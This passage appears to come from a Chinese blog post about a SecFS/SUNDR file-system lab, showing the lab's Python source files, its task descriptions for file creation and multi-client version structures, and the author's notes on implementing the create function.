class="built_in">isinstance</span>(other, User) <span class="keyword">and</span> <span class="variable language_">self</span>._uid == other._uid</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;uid=&#123;&#125;&gt;&quot;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>._uid)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hash</span>(<span class="variable language_">self</span>._uid)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Group</span>(<span class="title class_ inherited__">Principal</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, gid</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(gid, <span class="built_in">int</span>):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;id &#123;&#125; is not an int, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(gid, <span class="built_in">type</span>(gid)))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>._gid = gid</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>._gid, <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, state</span>):</span><br><span class="line">        <span class="variable language_">self</span>._gid = state[<span class="number">0</span>]</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">id</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._gid</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_group</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">isinstance</span>(other, Group) <span class="keyword">and</span> <span class="variable language_">self</span>._gid == other._gid</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;gid=&#123;&#125;&gt;&quot;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>._gid)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hash</span>(<span class="variable language_">self</span>._gid)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">I</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, principal, inumber=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(principal, Principal):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not a Principal, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(principal, <span class="built_in">type</span>(principal)))</span><br><span class="line">        <span class="keyword">if</span> inumber <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(inumber, <span class="built_in">int</span>):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;inumber &#123;&#125; is not an int, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(inumber, <span class="built_in">type</span>(inumber)))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>._p = principal</span><br><span class="line">        <span class="variable language_">self</span>._n = inumber</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>._p, <span class="variable language_">self</span>._n)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, state</span>):</span><br><span class="line">        <span class="variable language_">self</span>._p = state[<span class="number">0</span>]</span><br><span class="line">        <span class="variable language_">self</span>._n = state[<span class="number">1</span>]</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">p</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._p</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">n</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._n</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">allocate</span>(<span class="params">self, inumber</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>._n <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> AssertionError(<span class="string">&quot;tried to re-allocate allocated I &#123;&#125; with inumber &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>, inumber))</span><br><span class="line">        <span class="variable language_">self</span>._n = inumber</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">allocated</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._n <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">isinstance</span>(other, I) <span class="keyword">and</span> <span class="variable language_">self</span>._p == other._p <span class="keyword">and</span> <span class="variable language_">self</span>._n == other._n</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.allocated():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;(&#123;&#125;, &#123;&#125;)&quot;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>._p, <span class="variable language_">self</span>._n)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&#123;&#125;, &lt;unallocated&gt;)&quot;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>._p)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.allocated():</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;cannot hash unallocated i &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hash</span>((<span class="variable language_">self</span>._p, <span class="variable language_">self</span>._n))</span><br></pre></td></tr></table></figure><h4 id="secfs-store-block-py"><a href="#secfs-store-block-py" class="headerlink" title=".&#x2F;secfs&#x2F;store&#x2F;block.py"></a>.&#x2F;secfs&#x2F;store&#x2F;block.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 该文件处理与SecFS服务器的blob存储的所有交互。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务器连接句柄在装载时由secfs-fuse传递给我们</span></span><br><span class="line">server = <span class="literal">None</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">_server</span>):</span><br><span class="line">    <span class="keyword">global</span> server</span><br><span class="line">    server = _server</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">blob</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将给定的blob存储在服务器中，并返回内容的hash。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> server</span><br><span class="line">    <span class="keyword">return</span> server.store(blob)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">chash</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从服务器加载具有给定内容哈希的blob。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> server</span><br><span class="line">    blob = server.read(chash)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># RPC层将对二进制数据进行base64编码</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;data&quot;</span> <span class="keyword">in</span> blob:</span><br><span class="line">        <span class="keyword">import</span> base64</span><br><span class="line">        blob = base64.b64decode(blob[<span class="string">&quot;data&quot;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> blob</span><br></pre></td></tr></table></figure><h4 id="secfs-store-inode-py"><a href="#secfs-store-inode-py" class="headerlink" title=".&#x2F;secfs&#x2F;store&#x2F;inode.py"></a>.&#x2F;secfs&#x2F;store&#x2F;inode.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secfs.store.block</span><br><span class="line"><span class="keyword">import</span> secfs.crypto</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Inode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.size = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.kind = <span class="number">0</span> <span class="comment"># 0是目录，1是文件</span></span><br><span class="line">        <span class="variable language_">self</span>.ex = <span class="literal">False</span></span><br><span class="line">        <span class="variable language_">self</span>.ctime = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.mtime = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.blocks = []</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">ihash</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        根据一个inode的ihandle，加载其相关的所有元信息。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        d = secfs.store.block.load(ihash)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        n = Inode()</span><br><span class="line">        n.__dict__.update(pickle.loads(d))</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        读取该inode的块内容。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join([secfs.store.block.load(b) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="variable language_">self</span>.blocks])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bytes</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">       序列化该inode并返回相应的字节串。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        b = <span class="variable language_">self</span>.__dict__</span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(b)</span><br></pre></td></tr></table></figure><h4 id="secfs-store-tree-py"><a href="#secfs-store-tree-py" class="headerlink" title=".&#x2F;secfs&#x2F;store&#x2F;tree.py"></a>.&#x2F;secfs&#x2F;store&#x2F;tree.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 该文件提供了操作SecFS中的目录的功能。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secfs.fs</span><br><span class="line"><span class="keyword">import</span> secfs.crypto</span><br><span class="line"><span class="keyword">import</span> secfs.tables</span><br><span class="line"><span class="keyword">import</span> secfs.store.block</span><br><span class="line"><span class="keyword">from</span> secfs.store.inode <span class="keyword">import</span> Inode</span><br><span class="line"><span class="keyword">from</span> secfs.types <span class="keyword">import</span> I, Principal, User, Group</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_under</span>(<span class="params">dir_i, name</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    尝试在i处的目录下查找给定名称的文件或目录的i。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(dir_i, I):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not an I, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(dir_i, <span class="built_in">type</span>(dir_i)))</span><br><span class="line"></span><br><span class="line">    dr = Directory(dir_i)</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> dr.children:</span><br><span class="line">        <span class="keyword">if</span> f[<span class="number">0</span>] == name:</span><br><span class="line">            <span class="keyword">return</span> f[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Directory</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    目录用于封送和解封送目录inode的内容。要加载一个目录，必须给出一个i。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, i</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(i, I):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not an I, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">type</span>(i)))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.inode = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.children = []</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.inode = secfs.fs.get_inode(i)</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.inode.kind != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;inode with ihash &#123;&#125; is not a directory&quot;</span>.<span class="built_in">format</span>(secfs.tables.resolve(i)))</span><br><span class="line"></span><br><span class="line">        cnt = <span class="variable language_">self</span>.inode.read()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(cnt) != <span class="number">0</span>:</span><br><span class="line">            <span class="variable language_">self</span>.children = pickle.loads(cnt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bytes</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(<span class="variable language_">self</span>.children)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">dir_i, name, i</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    更新目录的inode内容，在给定名称下包含一个表示i的项。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(dir_i, I):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not an I, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(dir_i, <span class="built_in">type</span>(dir_i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(i, I):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not an I, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">type</span>(i)))</span><br><span class="line"></span><br><span class="line">    dr = Directory(dir_i)</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> dr.children:</span><br><span class="line">        <span class="keyword">if</span> f[<span class="number">0</span>] == name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">&quot;asked to add i &#123;&#125; to dir &#123;&#125; under name &#123;&#125;, but name already exists&quot;</span>.<span class="built_in">format</span>(i, dir_i, name))</span><br><span class="line"></span><br><span class="line">    dr.children.append((name, i))</span><br><span class="line">    new_dhash = secfs.store.block.store(dr.<span class="built_in">bytes</span>())</span><br><span class="line">    dr.inode.blocks = [new_dhash]</span><br><span class="line">    new_ihash = secfs.store.block.store(dr.inode.<span class="built_in">bytes</span>())</span><br><span class="line">    <span class="keyword">return</span> new_ihash</span><br></pre></td></tr></table></figure><h3 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h3><h4 id="（1）Enable-file-directory-creation"><a href="#（1）Enable-file-directory-creation" class="headerlink" title="（1）Enable file&#x2F;directory creation"></a>（1）Enable file&#x2F;directory creation</h4><p>​在文件 secfs&#x2F;fs.py 中，有一个名为create 的方法，它负责在文件系统中创建新文件和目录，并负责分 配和配置 inode，然后将其存储在服务器上，为新文件设置适当的 i，并将其链接到其父目录。如果你打开 这个文件，你会发现有一部分代码缺失了，缺失的部分用了一个大的 FIXME 注释块标识，解释丢失的代码 应该做什么。 </p><p>​在补写代码之前，你将无法创建新文件或目录，即使是 root，但可以查找现有文件或目录（例如.users 或.groups）。因此，从这里开始我们的实验。 </p><p>​为了补写代码，你首先应该尝试理解 secfs.tables.modmap 函数，这个函数修改 i-tables 将 i 映射为块哈 希。这是 SecFS 的关键函数，并在整个代码中广泛使用。要添加.和 ..，你应该查看 secfs.store.tree.add 函 数, 然后为了链接最后的 i，你将用到 secfs.fs.link 函数 （或者是 link，link 和create 在同一个文件中）。要 在服务器上存储数据，你需要使用相对简单的 secfs.store.block.store 函数。</p><p>​成功实施_create 后，你应该能在文件系统的根目录中以 root 身份创建新文件和目录。</p><blockquote><p>In the file <code>secfs/fs.py</code>, there is a function called <code>_create</code>. It is used to create new files and directories in the file system, and is responsible for allocating and configuring an inode, storing it on the server, setting up an appropriate <code>i</code> for the new file, and linking it into its parent directory. If you open it up, you will see that a chunk of the code is missing, denoted by a large <code>FIXME</code> comment block explaining what the missing code is supposed to do.</p><p>Until this code is filled in, you will be unable to create new files or directories, even as root, but looking up existing ones will work as expected (e.g. <code>.users</code> or <code>.groups</code>). This is therefore a natural place to start your implementation.</p><p>In order to write this code, you should first try to build a cursory understanding of the <code>secfs.tables.modmap</code> function, which modifies the <code>i</code>-tables that map <code>i</code>s to block hashes. This is a critical component of SecFS, and is used extensively throughout the code. For adding <code>.</code> and <code>..</code>, you should look at <code>secfs.store.tree.add</code>, and for linking in the final <code>i</code>, you will need to use <code>secfs.fs.link</code> (or just <code>link</code> since <code>_create</code> is in the same file). To store data on the server, you will also need to use the relatively straightforward <code>secfs.store.block.store</code>. You may find <code>secfs.fs.init</code> a useful starting point.</p><p>When you have implemented <code>_create</code> successfully, you should be able to create new files and directories as root in the root of the file system. You may also have to come back to this function when you implement multi-user support in Exercise 2 below.</p></blockquote><h4 id="（2）Multi-client-support"><a href="#（2）Multi-client-support" class="headerlink" title="（2）Multi-client support"></a>（2）Multi-client support</h4><p>你可能已经注意到，在出现第二个客户端之前可以正常运行 test.sh。当第二个客户端尝试访问已挂载 文件系统中的任何文件时，会出现错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LookupError: asked to resolve i ((0,False),0), but i does not exist</span><br></pre></td></tr></table></figure><p>​出现错误是因为第二个客户机没有访问文件系统的 i-tables，因为它们目前只存储在第一个客户机的内 存中。在 SUNDR 中，这些 i-tables 被持久保存在服务器上，通过对描述文件系统的版本结构（或 VSes）更 改 i 来更改对用户和组的 i-tables 。这些文件从服务器下载，然后用于验证本地下载的 i-tables。当文件系 统被更改时，一个新的、已签名的 VS 被上传到服务器，以便其他客户端可以看到更改。 </p><p>​具体来说，实验任务 2 是为了能够在单独的挂载点上启动第二个 SecFS 客户机，并能够运行命令 ls -la 来显示.users 和.groups 的文件。要完成本实验，你必须用 SUNDR 的版本结构列表替换 secfs&#x2F;tables.py 中的 current_itables 映射，该映射将用户和组句柄映射到文件哈希（参见论文的第 3.3.2 节）。这个列表必须与 服务器通信，以便其他客户机可以下载它，然后使用这些映射来探索文件系统。 </p><p>​当你可以使用第二个客户机读取文件系统中的文件时，尝试在一个客户机中创建几个文件(以root身份)， 并验证在另一个客户机挂载后运行 ls 时该文件是否出现。</p><blockquote><p>As you may have noticed, running <code>test.sh</code> works fine until a second client appears. When this second client attempts to access any file in the mounted file system, an error is given:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LookupError: asked to resolve i ((0, False), 0), but i does not exist</span><br></pre></td></tr></table></figure><p>This happens because the second client does not have access to the file system’s <code>i</code>-tables, since these are (currently) only stored in the memory of the first client. In SUNDR, these <code>i</code>-tables are persisted on the server, and changes to the <code>i</code>-tables of users and groups are announced through Version Structures (or VSes) that describe <em>changes</em> to the file system. These are downloaded from the server, verified, and then used to verify downloaded <code>i</code>-tables locally. When the file system is changed, a new, signed VS is uploaded to the server, so that other clients can see the change.</p><p>Specifically, your goal for the first exercise is to be able to start a second SecFS client (see “Interacting with the file system”) on a separate mount point, and be able to run <code>ls -la</code> to reveal the <code>.users</code> and <code>.groups</code> files. To do so, you will have to replace the <code>current_itables</code> map in <code>secfs/tables.py</code>, which maps user and group handles to file hashes, with SUNDR’s Version Structure List (see section 3.3.2 of the paper). This list must be communicated to the server so that other clients can download it, and then use those mappings to explore the file system.</p><p>You may want to first get the list working, and only afterwards add cryptographic signing and verification of the VSes. You should consider implementing your cryptographic operations in <code>secfs/crypto.py</code>. Public keys for users are available in <code>secfs.fs.usermap</code> (key is a <code>User</code>).</p><p>When you can read files in the file system using a second client, try to create a few file (as root) in one client, and verify that this file then appears when running <code>ls</code> in the other client’s mountpoint.</p></blockquote><h4 id="实验提示"><a href="#实验提示" class="headerlink" title="实验提示"></a>实验提示</h4><p>​实验中会用到 SUNDR 论文中的内容。我们在此处给出了从 SUNDR 论文中的图 2 和图 3 到 SecFS 中 文件的映射：</p><table><thead><tr><th align="left">structure</th><th align="left">location</th></tr></thead><tbody><tr><td align="left">i-tables</td><td align="left"><code>secfs/tables.py</code></td></tr><tr><td align="left">inodes</td><td align="left"><code>secfs/store/inode.py</code></td></tr><tr><td align="left">directory block</td><td align="left"><code>secfs/store/tree.py</code></td></tr><tr><td align="left">version structure</td><td align="left">has not been implemented, but should probably replace <code>current_itables</code> in <code>secfs/tables.py</code></td></tr></tbody></table><p>参考文献：inode.pdf——主要介绍了inode和i-table的关系</p><h3 id="实验一步骤"><a href="#实验一步骤" class="headerlink" title="实验一步骤"></a>实验一步骤</h3><p>先讲实验一，首先，由之前讲命名的那堂课可以知道，从文件名到磁盘上的块实现访问，需要经过十层间接层，中间就有一层是inode层。我们都知道，一个inode对应一个文件，且每个inode都有一个结点编号，元信息和指向块的指针。这几乎囊括了一个文件的所有信息。</p><p>这样我们只需要知道一个目录下有多少个inode编号，就可以知道有多少文件了，如何去高效的查找inode，这就用到了i-table，存有目录下的inode编号。</p><p>SUNDR使用i-handle来查找某个用户的i-table，这和实验一关系不大，所以略过不讲。</p><p>先来看需要补充的函数上方的init函数</p><p><img src="https://cdn.lmark.cc/img/image-20230506104528577.png"></p><p>可以看到，首先先给Inode结点分配了ihash，然后给这个ihash建立一个映射给root_i；这个实验主要操作的数据对象就是这个I类型，这个类型是由principal和i-number组成的。</p><p>这里的root_i对应的是根目录，因为一个目录下，无论如何都会有两个<code>.和..</code>这两个目录，用于指向父目录和自己，所以同时也需要创建两个文件。这里使用的add方法，也无需了解其实现，只要知道怎么用的就行了，大概就是将某个I对象映射到某个目录下，并起个名字。</p><p>这里在获得new_ihash之后，为什么要使用一个modmap映射呢？乍一看这里写的很抽象，我们知道，modmap作用是建立ihash的映射，并且返回一个I对象，这里并没有返回值，这是为什么呢？</p><p>其实这是modmap函数的另一个用法，修改i-table里i-number到ihash的映射，因为文件或目录被修改之后，需要重新生成一个ihash，add函数就是给目录增加文件的同时，返回了最新的ihash。</p><p>然后就到<code>users</code>和<code>groups</code>文件的生成了，文件的生成和目录是差不多的，主要是少了一步add的步骤。还多了一步link，我们都知道，在Linux文件系统中，文件的只有在连接数为0的时候才会删除，也就是说，增加连接数才会让一个文件出现（？大概）</p><p><img src="https://cdn.lmark.cc/img/image-20230506112453558.png"></p><p>综上，实验一的参考代码如下：</p><p><img src="https://cdn.lmark.cc/img/image-20230506112516514.png"></p><h3 id="实验二前瞻"><a href="#实验二前瞻" class="headerlink" title="实验二前瞻"></a>实验二前瞻</h3><p>反反复复看了好多遍实验一和SUNDR，才大概知道实验二要干嘛，我觉得吧，实验二主要是操作current_itables，让不同用户使用自己i-table，还有就是当文件修改后，要及时更新ihash且上传服务器，还有就是版本向量啥的，总之方向大概是这样。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机系统工程 </tag>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>自制Amiibo全记录</title>
      
      <link href="/archives/646e4863.html"/>
      <url>/archives/646e4863.html</url>
      
